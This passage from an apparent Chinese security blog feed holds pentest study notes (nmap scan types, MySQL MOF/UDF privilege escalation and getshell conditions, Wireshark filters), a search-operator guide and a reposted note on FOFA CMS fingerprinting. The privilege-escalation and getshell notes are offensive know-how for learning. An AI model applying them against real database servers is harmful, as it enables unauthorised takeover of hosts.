<li><p>预编译使用错误<br> 预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
</li>
<li><p>部分参数不可预编译<br> 在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
</li>
<li><p>预编译实现错误<br> 部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
</li>
</ol>
<h2 id="7-nmap扫码方式、种类"><a href="#7-nmap扫码方式、种类" class="headerlink" title="7. nmap扫码方式、种类"></a>7. nmap扫码方式、种类</h2><ul>
<li>端口扫描技术</li>
</ul>
<p>-sS（TCP SYN 扫描/半开扫描）<br>-sT（TCP connect()扫描）<br>-sU（UDP 扫描）<br>-sN、-sF、-sX（TCP Null、FIN、Xmas 扫描）<br>-sA（TCP ACK 扫描）<br>-sW（TCP 窗口扫描）<br>-sM（TCP Maimon 扫描）<br>–scanflags（定制的 TCP 扫描）<br>-sI（Idel 扫描）<br>-sO（IP 协议扫描）<br>-b（FTP 弹跳扫描）</p>
<ul>
<li>服务版本探测</li>
</ul>
<p>-sV（版本探测）<br>–allports（不为版本探测排除任何端口）<br>–version-intensity <intensity> （设置版本扫描强度）：<br>–version-light （打开轻量级模式）：<br>–version-all （尝试每个探测）：<br>–version-trace（(跟踪版本扫描活动）：<br>-sR（RPC 扫描）</intensity></p>
<h2 id="8-mysql的提权方式"><a href="#8-mysql的提权方式" class="headerlink" title="8. mysql的提权方式"></a>8. mysql的提权方式</h2><p><a class="link" href="https://blog.csdn.net/he_and/article/details/81434865">https://blog.csdn.net/he_and/article/details/81434865<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>1.原理<br>在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。<br>2.利用条件<br>    mysql用户具有root权限(对上面那个目录可写）<br>    关闭了secure-file-priv</p>
<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>1.原理<br>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限<br>2.利用条件    </p>
<ul>
<li><p>mysql &lt;  5.0，导出路径随意。</p>
</li>
<li><p>5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)</p>
<p> 查看路径：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%plugin%&#39;;</span><br></pre></td></tr></table></figure></li>
<li><p>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
</li>
<li><p>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</p>
</li>
<li><p>拥有可以将udf.dll写入相应目录的权限。这一条件主要是要看 secure_file_priv的值</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br></pre></td></tr></table></figure>
<p>   当secure_file_priv的值为NULL或/tmp/时，此时无法提权<br>   当secure_file_priv的值没有具体值时，则可以提权</p>
</li>
</ul>
<p>​    udf文件路径：</p>
<ul>
<li>sqlmap：sqlmap根目录/data/udf/mysql</li>
<li>msf：MSF根目录/embedded/framework/data/exploits/mysql</li>
<li>网页16进制：国光大佬写的<a class="link" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="9-mysql-getshell的方式"><a href="#9-mysql-getshell的方式" class="headerlink" title="9.mysql getshell的方式"></a>9.mysql getshell的方式</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul>
<li><p>root权限</p>
</li>
<li><p>绝对路径</p>
</li>
<li><p>文件写入 secure_file_priv参数</p>
</li>
</ul>
<h3 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h3><p>慢查询，写日志，</p>
<p>dumpfile()</p>
<p>outfile()</p>
<h2 id="10-linux-计划任务"><a href="#10-linux-计划任务" class="headerlink" title="10. linux 计划任务"></a>10. linux 计划任务</h2><h5 id="1-一次性任务计划：at"><a href="#1-一次性任务计划：at" class="headerlink" title="1.一次性任务计划：at"></a>1.一次性任务计划：at</h5><h5 id="2-周期性任务计划：crontab"><a href="#2-周期性任务计划：crontab" class="headerlink" title="2.周期性任务计划：crontab"></a>2.周期性任务计划：crontab</h5><h2 id="11-代码审计"><a href="#11-代码审计" class="headerlink" title="11. 代码审计"></a>11. 代码审计</h2><p>简单浏览网站目录结构</p>
<p>简单看完目录后，我会看主页的index.php，在看这个文件的同时，我还会打开它的网页，做到一边看代码，一边看网页的效果</p>
<p>看用户输入，找功能点，找敏感函数</p>
<h2 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h2><h2 id="9-wireshark过滤规则"><a href="#9-wireshark过滤规则" class="headerlink" title="9. wireshark过滤规则"></a>9. wireshark过滤规则</h2><h3 id="IP："><a href="#IP：" class="headerlink" title="IP："></a>IP：</h3><p>源、目的IP为xxx<br>ip.addr == 172.16.0.0/16<br>ip.src == 172.16.0.0/16<br>ip.dst == 192.168.0.0/16</p>
<h3 id="端口："><a href="#端口：" class="headerlink" title="端口："></a>端口：</h3><p>方法一样，但是需要区别TCP和UDP<br>TCP.port == 80<br>UDP.port == 3702<br>TCP.srcport == 80<br>tcp.dstport == 80<br>……</p>
<h3 id="协议："><a href="#协议：" class="headerlink" title="协议："></a>协议：</h3><p>协议直接输就行了<br>tcp<br>icmp<br>dns<br>snmp<br>……</p>
<h2 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10. 宽字节注入"></a>10. 宽字节注入</h2><p>留坑</p>
<h2 id="11-RSA加密过程"><a href="#11-RSA加密过程" class="headerlink" title="11. RSA加密过程"></a>11. RSA加密过程</h2><p>留坑</p>
]]></content>
  </entry>
  <entry>
    <title>高级搜索指令</title>
    <url>/2020/02/15/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8C%87%E4%BB%A4-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12311383.html">源地址：https://www.cnblogs.com/This-is-Y/p/12311383.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Google高级搜索语法指令"><a href="#Google高级搜索语法指令" class="headerlink" title="Google高级搜索语法指令"></a>Google高级搜索语法指令</h2><h4 id="1-allinanchor"><a href="#1-allinanchor" class="headerlink" title="1.allinanchor"></a>1.allinanchor</h4><p>anchor是一处说明性的文字，它标注说明了这个链接可能跳转到其它的网页或跳转到当前网页的不同地方。当我们用allinanchor提交查询的时候，Google会限制搜索结果必须是那些在anchor文字里包含了我们所有查询关键词的网页。例如： allinanchor: best efish tk 提交这个查询，Google仅仅会返回在网页anchor说明文字里边包含了关键词”best” “efish” 和”tk”的网面。</p>
<h4 id="2-inanchor"><a href="#2-inanchor" class="headerlink" title="2.inanchor"></a>2.inanchor</h4><p>当我们用inanchor提交查询的时候，Google会限制结果是那些在网页anchor链接里边包含了查询关键词的网页。例 restaurants inanchor:gourmet ，提交这个查询，Google会查询那些在anchor信息里包含了关键词”restaurants”和关键词”gourmet”的网页。</p>
<h4 id="3-allintext-（个人认为较重要）"><a href="#3-allintext-（个人认为较重要）" class="headerlink" title="3.allintext *（个人认为较重要）"></a>3.allintext *（个人认为较重要）</h4><p>当我们用allintext提交查询的时候，Google会限制搜索结果仅仅是在网页正文&lt;body&gt;里边包含了我们所有查询关键词的网页。例如 allintext: travel packing list 提交这个查询，Google仅仅会返回在一个网页包含了三个关键词”travel” “packing”和”list”的网页。</p>
<h4 id="4-intext"><a href="#4-intext" class="headerlink" title="4.intext *"></a>4.intext *</h4><p>当我们用intext进行查询的时候，Google会返回那些在网页&lt;body&gt;里边包含了我们查询关键词的网页。 Hamish Reid intext:pandemonia ，提交这个查询的时候，Google会返回在文本正文包含查询关键字pandemonia，在其它任何地方包含关键词”Hamish”和”Reid”的网页。（intext:后面直接跟查询关键字，不能有空格）</p>
<h4 id="5-allintitle"><a href="#5-allintitle" class="headerlink" title="5.allintitle *"></a>5.allintitle *</h4><p>当我们用allintitle提交查询的时候，Google会限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。例 allintitle: detect plagiarism ，提交这个查询，Google仅会返回在网页标题里边包含了”detect”和”plagiarism”这两个关键词的网页。</p>
<h4 id="6-intitle"><a href="#6-intitle" class="headerlink" title="6.intitle *"></a>6.intitle *</h4><p>当我们用intitle进行查询的时候，Google会返回那些在网页标题里边包含了我们查询关键词的网页。例 flu shot intitle:help ，提交这个查询，Google会返回在网页标题包含了查询关键字”help”，而在其它任何地文包含了查询关键字”flu” 和”shot”的网页。（intitle:后面也不能有空格）</p>
<h4 id="7-allinurl"><a href="#7-allinurl" class="headerlink" title="7.allinurl *"></a>7.allinurl *</h4><p>当我们用allinurl提交查询的时候，Google会限制搜索结果仅是那些在URL（网址）里边包含了我们所有查询关键词的网页。例 allinurl: google faq ，提交这个查询，Google仅会返回在URL里边包含了关键词”google”和”faq”的网页，象<a class="link" href="https://link.jianshu.com/?t=http://www.google.com/help">www.google.com/help<i class="fas fa-external-link-alt"></i></a> /faq.html等的网页。</p>
<h4 id="8-inurl"><a href="#8-inurl" class="headerlink" title="8.inurl *"></a>8.inurl *</h4><p>当我们用inurl进行查询的时候，Google会返回那些在URL（网址）里边包含了我们查询关键词的网页。例 inurl:print <a class="link" href="https://link.jianshu.com/?t=site:www.efish.tk">site:www.efish.tk<i class="fas fa-external-link-alt"></i></a> ，提交这个查询，Google会查找<a class="link" href="https://link.jianshu.com/?t=http://www.efish.tk">www.efish.tk<i class="fas fa-external-link-alt"></i></a>这个网站下面网址里边包含了查询关键词”print”的网页。</p>
<h4 id="9-author"><a href="#9-author" class="headerlink" title="9.author"></a>9.author</h4><p>当我们用author进行查询的时候，Google会限制返回结果仅仅是那些在Google论坛里边，包含了特定作者的新闻文章。在这里，作者名可以是全名，也可以是一部分或邮件地址。例 children author:john author:doe 2 或 children <a class="link" href="https://link.jianshu.com/?t=mailto:author:doe@someaddress.com">author:doe@someaddress.com<i class="fas fa-external-link-alt"></i></a> 返回结果将是作者John Doe 或是 <a class="link" href="https://link.jianshu.com/?t=mailto:doe@someaddress.com">doe@someaddress.com<i class="fas fa-external-link-alt"></i></a>写的，关于包含关键词children的文章。<br><br>bphonebook<br><br>用bphonebook进行查询的时候，返回结果将是那些商务电话资料。</p>
<h4 id="10-cache"><a href="#10-cache" class="headerlink" title="10.cache"></a>10.cache</h4><p>提交cache:url ，Google会显示当前网页的快照信息，从而替换网页的当前信息。例   <a class="link" href="https://link.jianshu.com/?t=cache:www.efish.tk">cache:www.efish.tk<i class="fas fa-external-link-alt"></i></a>  ，提交这个查询，Google会返回所有抓取的关于<a class="link" href="https://link.jianshu.com/?t=http://www.efish.tk">www.efish.tk<i class="fas fa-external-link-alt"></i></a>的网页快照信息。在显示的网页快照信息里边，Google会高亮显示查询关键词。（在cache:和URL之间不能有空格）</p>
<h4 id="11-datarange"><a href="#11-datarange" class="headerlink" title="11.datarange"></a>11.datarange</h4><p>当我们使用datarange进行查询的时候，Google会将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被google收录的时间算的。例 ”Geri Halliwell” “Spice Girls” daterange:2450958-2450968 。这里的时间日期格式是按天文学的儒略日。（这个搜索语法Google并不推荐使用，因为它会返回一些莫名其妙的东西）</p>
<h4 id="12-define"><a href="#12-define" class="headerlink" title="12.define"></a>12.define</h4><p>当我们用define进行查询的时候，Google会返回包含查询关键词定义的网面。例   define: blog  ，这个查询将会返回Blog的定义。</p>
<h4 id="13-filetype"><a href="#13-filetype" class="headerlink" title="13.filetype *"></a>13.filetype *</h4><p>当我们在查询里边包含filetype 扩展名的时候，Google会限制查询结果仅返回特定文件类型的网页。例   资产评估  filetype pdf  ，这个查询将会返回所有文件类型为pdf的资产评估信息。其它可用的特定文件类型格式查询还有doc ,txt,ppt,xls.rtf,swf,ps等。</p>
<h4 id="14-group"><a href="#14-group" class="headerlink" title="14.group"></a>14.group</h4><p>当我们用group查询的时候，Google会限制我们的论坛查询结果仅是某几个固定的论坛组或是某些特定主题组的新闻文章。例   sleep group:misc.kids.moderated  ，提交这个查询，Google仅会返回在用户组misc.kids.moderated里边包含了查询关键字”sleep”的文章。</p>
<h4 id="15-info"><a href="#15-info" class="headerlink" title="15.info"></a>15.info</h4><p>提交info:url，将会显示需要查询网站的一些信息。例   info:gothotel.com  ，提交这个查询，将会返回网站 gothotel.com的所有信息。</p>
<h4 id="16-insubject"><a href="#16-insubject" class="headerlink" title="16.insubject"></a>16.insubject</h4><p>当我们用insubject进行查询的时候，Google会限制论坛搜索结果仅是那些在主题里边包含了查询关键词的网面。   insubject:”falling asleep”  ，提交这个查询，Google会返回在文章主题里边包含了”falling asleep”的文章。</p>
<h4 id="17-link"><a href="#17-link" class="headerlink" title="17.link"></a>17.link</h4><p>当我们使用link:URL提交查询的时候，Google会返回跟此URL做了链接的网站。例   <a class="link" href="https://link.jianshu.com/?t=link:www.efish.tk">link:www.efish.tk<i class="fas fa-external-link-alt"></i></a> ，提交这个查询，我们将得到所有跟<a class="link" href="https://link.jianshu.com/?t=http://www.ssooo.com">www.ssooo.com<i class="fas fa-external-link-alt"></i></a>这个网站做了链接的网站。（link是个单独的语法，只能单独使用，且后面不能跟查询关键词，跟能跟 URL）</p>
<h4 id="18-location"><a href="#18-location" class="headerlink" title="18.location"></a>18.location</h4><p>当我们提交location进行Google新闻查询的时候，Google仅会返回你当前指定区的跟查询关键词相关的网页。例[ queen location:canada ]，提交这个查询，Google会返回加拿大的跟查询关键词”queen”相匹配的网站。</p>
<h4 id="19-movie"><a href="#19-movie" class="headerlink" title="19.movie"></a>19.movie</h4><p>当我们用movie提交查询的时候，Google会返回跟查询关键词相关的电影信息。(当前只支持英文Google)</p>
<h4 id="20-phonebook"><a href="#20-phonebook" class="headerlink" title="20.phonebook"></a>20.phonebook</h4><p>当我们用phonebook进行查询的时候，Google会返回美国当地跟查询关键词相关的电话信息。（使用phonebook的时候需要指定详细的州名和地点名）例，   phonebook:smith ca</p>
<h4 id="21-related"><a href="#21-related" class="headerlink" title="21.related"></a>21.related</h4><p>用related提交查询，Google会返回跟我们要查询的网站结构内容相似的一些其它网站。例  <a class="link" href="https://link.jianshu.com/?t=related:www.consumerreports.org">related:www.consumerreports.org<i class="fas fa-external-link-alt"></i></a>  ，提交这个查询，Google会返回所有跟网站<a class="link" href="https://link.jianshu.com/?t=http://www.consumerreports.org">www.consumerreports.org<i class="fas fa-external-link-alt"></i></a>结构内容相似的网站。我们也可以通过点击搜索结果后面的相似网页，来查询跟当前网页类似的网页。（related:后面不能跟空格）</p>
<h4 id="22-rphonebook"><a href="#22-rphonebook" class="headerlink" title="22.rphonebook"></a>22.rphonebook</h4><p>这个查询用来搜索美国当地跟查询关键词相关的住宅电话信息。</p>
<h4 id="23-safesearch"><a href="#23-safesearch" class="headerlink" title="23.safesearch"></a>23.safesearch</h4><p>用safesearch提交查询的时候，Google会过滤你搜索的结果，其中过滤的内容可能包括一些色情的，暴力，赌博性质的，还有传染病毒的网页。但是它不是百分之百确保安全的。例，   safesearch:breasts 。</p>
<h4 id="24-site"><a href="#24-site" class="headerlink" title="24.site"></a>24.site</h4><p>当我们用site提交查询的时候，Google会限制查询仅在某个网站，或是某个域下面进行。例   admissions <a class="link" href="https://link.jianshu.com/?t=site:www.lse.ac.uk">site:www.lse.ac.uk<i class="fas fa-external-link-alt"></i></a>  ，提交这个查询仅仅会搜索网站<a class="link" href="https://link.jianshu.com/?t=http://www.lse.ac.uk">www.lse.ac.uk<i class="fas fa-external-link-alt"></i></a>下面关于admissions的信息。我们还可以限制搜索仅在域下面进行，例   javascript <a class="link" href="https://link.jianshu.com/?t=site:edu.cn">site:edu.cn<i class="fas fa-external-link-alt"></i></a>  ，提交这个查询，仅仅在教育网查询关于javascript的信息。（site:后面不能跟空格，且site命令可以配合其它命令进行）</p>
<h4 id="25-source"><a href="#25-source" class="headerlink" title="25.source"></a>25.source</h4><p>当用source提交查询的时候，Google新闻会限制我们的查询仅是那些我们指定了特定ID或新闻源的网址。例   election source:new_york_times  ，提交这个查询，Google将会显示纽约时报包含了查询关键词”election”的相关文章。（我们也可以通过Google news高级搜索完成查询）</p>
<h4 id="26-stocks"><a href="#26-stocks" class="headerlink" title="26.stocks"></a>26.stocks</h4><p>当我们用stocks提交查询的时候，Google会返回跟查询关键词相关的股票信息，这些信息一般来自于其它一些专业的财经网站。</p>
<h4 id="27-store"><a href="#27-store" class="headerlink" title="27.store"></a>27.store</h4><p>当我们用store提交查询的时候，Google Froogle仅会显示我们指定了store ID的结果。例   polo shirt store:llbean  ，提交这个查询，仅会搜索商店L. L. Bean.跟关键词”polo” “shirt”相关的结果。（只支持英文Google）</p>
<h4 id="28-tq"><a href="#28-tq" class="headerlink" title="28.tq"></a>28.tq</h4><p>如果想查某个地方的天气如何,我们只要在Google搜索框中输入”城市名称 Tq”就可以查询到这个城市的天状况.例”上海 tq”,当然tq也可以用汉字的天气代替。</p>
<h4 id="29-weather"><a href="#29-weather" class="headerlink" title="29.weather"></a>29.weather</h4><p>当我们用weather提交查询的时候，如果我们指出一个Google可以识别的地区或城市，Google会返回该地区或城市当前的天气状况。</p>
<hr>
<h2 id="百度高级搜索指令"><a href="#百度高级搜索指令" class="headerlink" title="百度高级搜索指令"></a>百度高级搜索指令</h2><h4 id="1-双引号-“"><a href="#1-双引号-“" class="headerlink" title="1.双引号 “"></a>1.双引号 “</h4><p>把搜索词放在双引号中，代表完全匹配搜索，也就是说搜索结果返回的页面包含双引号中出现的所有的词，连顺序也必须完全匹配。百度和Google都支持这个指令。例如搜索：“中药面膜”</p>
<h4 id="2-减号"><a href="#2-减号" class="headerlink" title="2.减号 -"></a>2.减号 -</h4><p>减号代表搜索不包含减号后面的词的页面。使用这个指令时减号前面必须是空格，减号后面没有空格，紧跟着需要排除的词。Google和百度都支持这个指令。例如：腰带-加工 返回的则是包含“皮带”这个词，却不包含“加工”这个词的结果</p>
<h4 id="3-星号"><a href="#3-星号" class="headerlink" title="3.星号"></a>3.星号</h4><p>星号是常用的通配符，也可以用在搜索中。百度不支持号搜索指令。比如在Google中搜索：婴儿湿疹其中的号代表任何文字。返回的结果就不仅包含“男士皮带”，还包含了“男士腰带”，“男士裤带”等内容。</p>
<h4 id="4-inurl"><a href="#4-inurl" class="headerlink" title="4.inurl"></a>4.inurl</h4><p>inurl: 指令用于搜索查询词出现在url 中的页面。百度和Google都支持inurl指令。inurl指令支持中文和英文。比如搜索：inurl:鳄鱼皮腰带，返回的结果都是网址url中包含 “鳄鱼皮腰带”的页面，如：<a class="link" href="https://link.jianshu.com/?t=http://www.paikau.com/static/">www.paikau.com/static/<i class="fas fa-external-link-alt"></i></a>鳄鱼皮腰带.html。由于关键词出现在url中对排名有一定影响，使用 inurl:搜索可以更准确地找到竞争对手。</p>
<h4 id="5-inanchor"><a href="#5-inanchor" class="headerlink" title="5.inanchor"></a>5.inanchor</h4><p>inanchor:指令返回的结果是导入链接锚文字中包含 搜索词的页面。百度不支持inanchor。比如在Google搜索 ：inanchor:腰带返回的结果页面本身并不一定包含“腰带”这两个字，而是指向这些页面的链接锚文字中出现了“腰带”这两个字。可以用来找到某个关 键词的竞争对手，而且这些竞争对手往往是做过SEO的。研究竞争对手页面有哪些外部链接，就可以找到很多链接资源.</p>
<h4 id="6-intitle-1"><a href="#6-intitle-1" class="headerlink" title="6.intitle"></a>6.intitle</h4><p>intitle: 指令返回的是页面title中包含关键词的页面。Google和百度都支持intitle 指令。使用intitle指令找到的文件是更准确的竞争页面。如果关键词只出现在页面可见文字中，而没有出现在title 中，大部分情况是并没有针对关键词进行优化，所以也不是有力的竞争对手。</p>
<h4 id="7-allintitle"><a href="#7-allintitle" class="headerlink" title="7.allintitle"></a>7.allintitle</h4><p>allintitle:搜索返回的是页面标题中包含多组关键词的文件。例如 ：allintitle:SEO 搜索引擎优化就相当于：intitle:SEO intitle:搜索引擎优化返回的是标题中既包含“SEO”，也包含“搜索引擎优化”的页面</p>
<h4 id="8-allinurl"><a href="#8-allinurl" class="headerlink" title="8.allinurl"></a>8.allinurl</h4><p>与allintitle: 类似。allinurl:SEO 搜索引擎优化就相当于：inurl:SEO inurl:搜索引擎优化</p>
<h4 id="9-filetype"><a href="#9-filetype" class="headerlink" title="9.filetype"></a>9.filetype</h4><p>用于搜索特定文件格式。Google和百度都支持filetype指令。比如搜索filetype:pdf 腰带返回的就是包含腰带这个关键词的所有pdf文件。</p>
<h4 id="10-site"><a href="#10-site" class="headerlink" title="10.site"></a>10.site</h4><p>site:是SEO最熟悉的高级搜索指令，用来搜索某个域名下的所有文件。</p>
<h4 id="11-linkdomain"><a href="#11-linkdomain" class="headerlink" title="11.linkdomain"></a>11.linkdomain</h4><p>linkdomain: 指令只适用于雅虎，返回的是某个域名的反向链接。雅虎的反向链接数据还比较准确，是SEO人员研究竞争对手外部链接情况的重要工具之一。比如搜索 linkdomain:paikau.com-site:paikau.com得到的就是腰带厂的外部链接，因为-site:paikau.com已经排 除了派高皮具公司网站的页面，也就是内部链接，剩下的就都是外部链接了。</p>
<h4 id="12-related"><a href="#12-related" class="headerlink" title="12.related"></a>12.related</h4><p>related:指令只适用于 Google，返回的结果是与某个网站有关联的页面。比如搜索related:paikau.com我们就可以得到Google所认为的与腰带厂有关联的 其他页面。 这种关联到底指的是什么，Google并没有明确说明，一般认为指的是有共同外部链接的网站。</p>
<h4 id="13-Domain"><a href="#13-Domain" class="headerlink" title="13.Domain"></a>13.Domain</h4><p>用domain命令可以查找跟某一网站相关的信息。例提交“<a class="link" href="https://link.jianshu.com/?t=domain:www.paikau.com">domain:www.paikau.com<i class="fas fa-external-link-alt"></i></a>“</p>
<h4 id="14-Filetype"><a href="#14-Filetype" class="headerlink" title="14.Filetype"></a>14.Filetype</h4><p>限制查找文件的格式类型。目前可以查找的文件类型有.pdf/.doc/.xls/.ppt/.rtf 用法：搜索关键字 +filetype:ppt 例如：男士皮带+filetype:pdf</p>
<h4 id="15-inurl"><a href="#15-inurl" class="headerlink" title="15.inurl"></a>15.inurl</h4><p>限定查询匹配只搜索URL链接。 inurl:腰带(查找网站目录收录不错)</p>
<h4 id="16-link"><a href="#16-link" class="headerlink" title="16.link"></a>16.link</h4><p>网站外链接查询。<a class="link" href="https://link.jianshu.com/?t=Link:www.paikau.com">Link:www.paikau.com<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="17-Site"><a href="#17-Site" class="headerlink" title="17.Site"></a>17.Site</h4><p>网站整站搜索引擎收录查询。例:<a class="link" href="https://link.jianshu.com/?t=site:www.paikau.com">site:www.paikau.com<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="18-intitle"><a href="#18-intitle" class="headerlink" title="18.intitle"></a>18.intitle</h4><p>搜索网页标题中含有的关键词，例:想搜索标题中含有“广州腰带厂”的内容，搜索：intitle:广州腰带厂</p>
<h4 id="百度基本搜索技巧"><a href="#百度基本搜索技巧" class="headerlink" title="百度基本搜索技巧"></a>百度基本搜索技巧</h4><li>
百度搜索引擎简单方便。仅需输入查询内容并敲一下回车键(Enter)，即可得到相关资料。或者输入查询内容后，用鼠标点击“百度搜索”按钮，也可得到相关资料。


</li>
<li>
输入多个词语搜索


</li>
<li>
输入多个词语搜索(不同字词之间用一个空格隔开)，可以获得更精确的搜索结果。


</li>




<p>例如：想了解“广州皮带生产厂家”相关信息，在搜索框中输入获得的搜索效果会比输入“广州皮带生产”得到的结果更好。</p>
<li>
在百度查询时不需要使用符号”AND”或”+”


</li>
<li>
百度会在多个以空格隔开的词语之间自动添加”+”。百度提供符合您全部查询条件的资料，并把最相关的网页排在前列。


</li>
<li>
减除无关资料


</li>




<p>有时候，排除含有某些词语的资料有利于缩小查询范围。百度支持“-”功能，用于有目的地删除某些无关网页，但减号之前必须留一空格。</p>
<ul>
<li>并行搜索</li>
</ul>
<p>使用“A|B”来搜索“或者包含词语A，或者包含词语B”的网页。</p>
<p>例如：您要查询“广州”或“皮带”相关资料，无须分两次查询，只要输入“广州|皮带”搜索即可。 百度会提供跟“|”前后任何字词相关的资料，并把最相关的网页排在前列。</p>
<ul>
<li>相关检索</li>
</ul>
<p>如果您无法确定输入什么词语才能找到满意的资料，可以试用百度相关检索。</p>
<p>您可以先输入一个简单词语搜索，然后，百度搜索引擎会为您提供“其它用户搜索过的相关搜索词语”作参考。您点击其中一个相关搜索词，都新版。百度和网页作者无关，不对网页的内容负责。</p>
<ul>
<li>index命令</li>
</ul>
<p>在关键词输入框中输入index of 皮带，选择回车搜索，得到了一些网页，不要以为这是一些普通的页面，其实它们是一些皮带网站的资源列表，点击打开它来看看。</p>
<p>关于百度搜索高级搜索指令的示例，这有一篇博客写的挺不错的：<a class="link" href="https://blog.csdn.net/cx243698/article/details/80625384">https://blog.csdn.net/cx243698/article/details/80625384<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="必应高级搜索指令"><a href="#必应高级搜索指令" class="headerlink" title="必应高级搜索指令"></a>必应高级搜索指令</h2><h4 id="1-contains"><a href="#1-contains" class="headerlink" title="1.contains:"></a>1.contains:</h4><p>只搜索包含指定文件类型的链接的网站。</p>
<h4 id="2-filetype"><a href="#2-filetype" class="headerlink" title="2.filetype:"></a>2.filetype:</h4><p>仅返回以指定文件类型创建的网页。</p>
<h4 id="3-inanchor-、inbody-、intitle"><a href="#3-inanchor-、inbody-、intitle" class="headerlink" title="3.inanchor:、inbody:、intitle:"></a>3.inanchor:、inbody:、intitle:</h4><p>这些关键字将返回元数据中包含指定搜索条件（如定位标记、正文或标题等）的网页。为每个搜索条件指定一个关键字，您也可以根据需要使用多个关键字。</p>
<h4 id="4-ip"><a href="#4-ip" class="headerlink" title="4.ip:"></a>4.ip:</h4><p>查找托管在特定 IP 地址  的网站。IP 地址必须是以英文句点分开的地址。键入关键字 ip:，后面加网站的 IP 地址。</p>
<h4 id="5-language"><a href="#5-language" class="headerlink" title="5.language:"></a>5.language:</h4><p>返回指定语言的网页。在关键字 language: 后面直接指定语言代码。使用搜索生成器中的“语言”功能也可以指定网页的语言。</p>
<h4 id="6-loc-或-location"><a href="#6-loc-或-location" class="headerlink" title="6.loc: 或 location:"></a>6.loc: 或 location:</h4><p>返回特定国家或地区的网页。在关键字 loc: 后面直接指定国家或地区代码。若要搜索两种或两种以上语言，请使用逻辑运算符 OR 对语言分组。</p>
<h4 id="7-prefer"><a href="#7-prefer" class="headerlink" title="7.prefer:"></a>7.prefer:</h4><p>着重强调某个搜索条件或运算符，以限定搜索结果。</p>
<h4 id="8-site"><a href="#8-site" class="headerlink" title="8.site:"></a>8.site:</h4><p>返回属于指定网站的网页。若要搜索两个或更多域，请使用逻辑运算符 OR 对域进行分组。您可以使用 site: 搜索不超过两层的 Web 域、顶级域及目录。您还可以在一个网站上搜索包含特定搜索字词的网页。</p>
<h4 id="9-feed"><a href="#9-feed" class="headerlink" title="9.feed:"></a>9.feed:</h4><p>在网站上查找搜索条件的 RSS (Really Simple Syndication ) 或 Atom 源。</p>
<h4 id="10-hasfeed"><a href="#10-hasfeed" class="headerlink" title="10.hasfeed:"></a>10.hasfeed:</h4><p>在网站上查找包含搜索条件的 RSS 或 Atom 源的网页。</p>
<h4 id="11-url"><a href="#11-url" class="headerlink" title="11.url:"></a>11.url:</h4><p>检查列出的域或网址是否位于 Bing 索引中。</p>
<p><strong>注：以上信息均来源于网络</strong></p>
<p><br><br><br>来源：<a class="link" href="https://www.jianshu.com/p/6c4d5859d39c">https://www.jianshu.com/p/6c4d5859d39c<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>（转载）  fofa语法的cms识别脚本</title>
    <url>/2020/11/14/%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89%20%20fofa%E8%AF%AD%E6%B3%95%E7%9A%84cms%E8%AF%86%E5%88%AB%E8%84%9A%E6%9C%AC-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13974951.html">源地址：https://www.cnblogs.com/This-is-Y/p/13974951.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>转载自：<a class="link" href="https://x.hacking8.com/post-383.html">https://x.hacking8.com/post-383.html<i class="fas fa-external-link-alt"></i></a></strong></p>
<p> </p>
<p>基于 <a class="link" href="https://github.com/TideSec/TideFinger/blob/master/cms_finger.db">https://github.com/TideSec/TideFinger/blob/master/cms_finger.db<i class="fas fa-external-link-alt"></i></a> cms指纹库中的fofa指纹。</p>
<img src="cr6TE_image-20200703160721880.png" alt="image-20200703160721880">

<p>可以看到识别规则会包含一些逻辑运算符，原作者只使用了正则来粗略的处理，感觉误报会很多，于是我用“后缀表达式”的方法来识别这些运算符，感觉算是可以完美处理这些规则了。</p>
<p>支持 body=”” titile=”” 这些语法，支持 &amp;&amp; || ( ) 等的运算符。同时也把sqlite数据导出为json格式，然后自己也加了一些识别规则。</p>
<p>p s: 用类似表达式的方式来作指纹识别，只访问一次首页就能得出结果，用各种运算符来保证准确性，感觉挺不错的。</p>
<p><strong>指纹</strong></p>
<p><br><strong>识别代码</strong></p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
</search>
